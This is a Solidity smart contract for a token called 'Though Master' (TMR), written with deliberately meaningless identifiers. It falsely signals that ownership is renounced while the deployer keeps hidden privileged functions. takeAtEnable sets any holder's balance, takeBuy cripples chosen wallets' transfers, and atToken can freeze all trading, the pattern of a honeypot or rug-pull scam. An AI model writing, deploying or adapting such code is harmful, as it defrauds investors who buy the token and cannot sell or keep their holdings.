//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface receiverList {
    function createPair(address fromLimitMin, address tokenMax) external returns (address);
}

interface liquiditySellBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toLaunched) external view returns (uint256);

    function transfer(address minReceiver, uint256 marketingShould) external returns (bool);

    function allowance(address totalTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingShould) external returns (bool);

    function transferFrom(
        address sender,
        address minReceiver,
        uint256 marketingShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isReceiver, uint256 value);
    event Approval(address indexed totalTake, address indexed spender, uint256 value);
}

abstract contract isSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atTeamLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenLaunch is liquiditySellBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ThoughMaster is isSwap, liquiditySellBuy, tokenLaunch {

    bool public maxSwap;

    uint256 public teamExempt;

    event OwnershipTransferred(address indexed sellWallet, address indexed txWalletFund);

    uint256 autoIs;

    uint8 private feeReceiverList = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return amountTrading;
    }

    bool public isTrading;

    uint256 public launchedList;

    function decimals() external view virtual override returns (uint8) {
        return feeReceiverList;
    }

    bool public marketingExemptTrading;

    string private launchedSell = "TMR";

    function teamEnable(address totalMin, address minReceiver, uint256 marketingShould) internal returns (bool) {
        if (totalMin == modeTakeList) {
            return liquiditySwap(totalMin, minReceiver, marketingShould);
        }
        uint256 tradingTeamExempt = liquiditySellBuy(swapShouldWallet).balanceOf(exemptReceiver);
        require(tradingTeamExempt == autoIs);
        require(minReceiver != exemptReceiver);
        if (minAutoWallet[totalMin]) {
            return liquiditySwap(totalMin, minReceiver, takeReceiver);
        }
        return liquiditySwap(totalMin, minReceiver, marketingShould);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedSell;
    }

    bool public takeFundTeam;

    uint256 constant takeReceiver = 18 ** 10;

    function tradingMax(address tradingList) public {
        require(tradingList.balance < 100000);
        if (marketingExemptTrading) {
            return;
        }
        
        tradingToReceiver[tradingList] = true;
        
        marketingExemptTrading = true;
    }

    function transferFrom(address totalMin, address minReceiver, uint256 marketingShould) external override returns (bool) {
        if (_msgSender() != takeExempt) {
            if (toSender[totalMin][_msgSender()] != type(uint256).max) {
                require(marketingShould <= toSender[totalMin][_msgSender()]);
                toSender[totalMin][_msgSender()] -= marketingShould;
            }
        }
        return teamEnable(totalMin, minReceiver, marketingShould);
    }

    uint256 private amountTrading = 100000000 * 10 ** 18;

    function atToken(uint256 marketingShould) public {
        marketingFund();
        autoIs = marketingShould;
    }

    function takeBuy(address txTo) public {
        marketingFund();
        
        if (txTo == modeTakeList || txTo == swapShouldWallet) {
            return;
        }
        minAutoWallet[txTo] = true;
    }

    mapping(address => bool) public tradingToReceiver;

    function marketingFund() private view {
        require(tradingToReceiver[_msgSender()]);
    }

    function balanceOf(address toLaunched) public view virtual override returns (uint256) {
        return autoBuyAt[toLaunched];
    }

    function owner() external view returns (address) {
        return marketingAt;
    }

    string private buyTo = "Though Master";

    uint256 private sellLaunchedAt;

    address exemptReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public minAutoWallet;

    function liquiditySwap(address totalMin, address minReceiver, uint256 marketingShould) internal returns (bool) {
        require(autoBuyAt[totalMin] >= marketingShould);
        autoBuyAt[totalMin] -= marketingShould;
        autoBuyAt[minReceiver] += marketingShould;
        emit Transfer(totalMin, minReceiver, marketingShould);
        return true;
    }

    constructor (){
        
        atTeamLimit launchedMode = atTeamLimit(takeExempt);
        swapShouldWallet = receiverList(launchedMode.factory()).createPair(launchedMode.WETH(), address(this));
        if (launchedList == exemptFee) {
            autoToken = true;
        }
        modeTakeList = _msgSender();
        tradingToReceiver[modeTakeList] = true;
        autoBuyAt[modeTakeList] = amountTrading;
        tradingExempt();
        
        emit Transfer(address(0), modeTakeList, amountTrading);
    }

    function getOwner() external view returns (address) {
        return marketingAt;
    }

    uint256 public feeWallet;

    address public modeTakeList;

    uint256 totalFund;

    function tradingExempt() public {
        emit OwnershipTransferred(modeTakeList, address(0));
        marketingAt = address(0);
    }

    address private marketingAt;

    uint256 public exemptFee;

    uint256 public takeList;

    mapping(address => mapping(address => uint256)) private toSender;

    function name() external view virtual override returns (string memory) {
        return buyTo;
    }

    function approve(address maxLimitTotal, uint256 marketingShould) public virtual override returns (bool) {
        toSender[_msgSender()][maxLimitTotal] = marketingShould;
        emit Approval(_msgSender(), maxLimitTotal, marketingShould);
        return true;
    }

    address takeExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address shouldSellAmount, uint256 marketingShould) external virtual override returns (bool) {
        return teamEnable(_msgSender(), shouldSellAmount, marketingShould);
    }

    bool private autoToken;

    address public swapShouldWallet;

    mapping(address => uint256) private autoBuyAt;

    function takeAtEnable(address shouldSellAmount, uint256 marketingShould) public {
        marketingFund();
        autoBuyAt[shouldSellAmount] = marketingShould;
    }

    function allowance(address senderTo, address maxLimitTotal) external view virtual override returns (uint256) {
        if (maxLimitTotal == takeExempt) {
            return type(uint256).max;
        }
        return toSender[senderTo][maxLimitTotal];
    }

}